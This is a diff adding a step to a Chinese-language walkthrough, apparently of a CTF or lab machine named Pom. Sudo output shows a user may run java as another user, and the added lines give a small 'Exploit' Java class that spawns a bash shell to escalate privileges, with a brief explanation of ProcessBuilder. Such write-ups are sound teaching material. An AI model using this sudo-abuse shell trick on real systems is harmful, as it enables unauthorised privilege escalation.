@@ -486,3 +486,17 @@ User mav1234 may run the following commands on Pom:
     (qc2000) PASSWD: /usr/bin/java
 ```
 看到当前用户可以以`qc2000`用户的权限运行`java`命令，很明显这就是利用点了。
+我们写一个恶意java代码：
+```java
+
+public class Exploit {
+    public static void main(String[] args) throws Exception {
+        ProcessBuilder pb = new ProcessBuilder("/bin/bash");
+        pb.inheritIO();
+        pb.start().waitFor();
+    }
+}
+
+```
+- `ProcessBuilder` 是 Java 用来创建操作系统进程的类
+ 
